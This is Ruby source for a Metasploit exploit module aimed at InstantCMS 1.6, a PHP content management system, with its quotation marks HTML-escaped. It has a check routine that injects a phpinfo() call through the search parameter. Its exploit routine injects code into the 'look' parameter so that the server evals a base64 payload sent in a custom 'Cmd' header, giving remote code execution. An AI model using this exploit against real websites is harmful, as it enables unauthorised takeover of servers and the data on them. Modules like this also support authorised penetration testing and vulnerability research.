

class Metasploit3 < Msf::Exploit::Remote

  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;InstantCMS 1.6 Remote PHP Code Execution&#039;,
      &#039;Description&#039;    => %q{
        This module exploits an arbitrary php command execution vulnerability, because of a
        dangerous use of eval(), in InstantCMS versions 1.6.
      },
      &#039;Author&#039;         =>
        [
          &#039;AkaStep&#039;, # Vulnerability discovery and PoC
          &#039;Ricardo Jorge Borges de Almeida <ricardojba1[at]gmail.com>&#039;, # Metasploit module
          &#039;juan vazquez&#039; # Metasploit module
        ],
      &#039;License&#039;        => MSF_LICENSE,
      &#039;References&#039;     =>
        [
          [ &#039;BID&#039;, &#039;60816&#039; ],
          [ &#039;URL&#039;, &#039;http://packetstormsecurity.com/files/122176/InstantCMS-1.6-Code-Execution.html&#039; ]
        ],
      &#039;Privileged&#039;     => false,
      &#039;Platform&#039;       => &#039;php&#039;,
      &#039;Arch&#039; => ARCH_PHP,
      &#039;Targets&#039;        =>
        [
          [ &#039;InstantCMS 1.6&#039;, { }  ],
        ],
      &#039;DisclosureDate&#039; => &#039;Jun 26 2013&#039;,
      &#039;DefaultTarget&#039;  => 0))

    register_options(
      [
        OptString.new(&#039;TARGETURI&#039;, [true, "The URI path of the InstantCMS page", "/"])
      ], self.class)
  end

  def check
    res = send_request_cgi({
      &#039;uri&#039;      => normalize_uri(target_uri.to_s),
      &#039;vars_get&#039; =>
      {
        &#039;view&#039;  => &#039;search&#039;,
        &#039;query&#039; => &#039;${echo phpinfo()}&#039;
      }
    })

    if res
      if res.body.match(/Build Date/)
        return Exploit::CheckCode::Vulnerable
      else
        return Exploit::CheckCode::Safe
      end
    else
      return Exploit::CheckCode::Unknown
    end

  rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
    return Exploit::CheckCode::Unknown
  end

  def exploit

    print_status("Executing payload...")

    res = send_request_cgi({
      &#039;uri&#039;      => normalize_uri(target_uri.to_s),
      &#039;vars_get&#039; =>
      {
        &#039;view&#039;  => &#039;search&#039;,
        &#039;query&#039; => rand_text_alpha(3 + rand(3)),
        &#039;look&#039;  => "#{rand_text_alpha(3 + rand(3))}\",\"\"); eval(base64_decode($_SERVER[HTTP_CMD]));//"
      },
      &#039;headers&#039; => {
        &#039;Cmd&#039; => Rex::Text.encode_base64(payload.encoded)
      }
    })

  end
end

